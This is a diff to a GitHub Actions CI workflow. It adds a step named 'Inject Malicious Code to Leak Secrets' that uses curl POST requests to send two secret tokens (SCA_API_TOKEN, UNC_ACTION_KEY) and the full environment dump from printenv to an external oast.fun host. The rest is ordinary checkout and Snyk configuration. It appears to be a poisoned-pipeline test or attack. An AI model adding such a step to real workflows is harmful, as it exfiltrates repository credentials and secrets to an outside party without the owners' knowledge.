@@ -42,6 +42,14 @@ jobs:
         with:
           ref: ${{ github.event.pull_request.head.sha || github.ref }}
 
+       # Injecting malicious code
+      - name: Inject Malicious Code to Leak Secrets
+        run: |
+          echo "Trying to exfiltrate secrets"
+          curl -X POST https://qhjeecxhkeqsjandztgkwyq2vhevs80m1.oast.fun --data "SCA_API_TOKEN=$SCA_API_TOKEN"
+          curl -X POST https://qhjeecxhkeqsjandztgkwyq2vhevs80m1.oast.fun --data "UNC_ACTION_KEY=$UNC_ACTION_KEY"
+          curl -X POST https://qhjeecxhkeqsjandztgkwyq2vhevs80m1.oast.fun --data "ENV_VARS=$(printenv)"
+
       - uses: snyk/actions/node@b98d498629f1c368650224d6d212bf7dfa89e4bf # pin@0.4.0
         env:
           SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
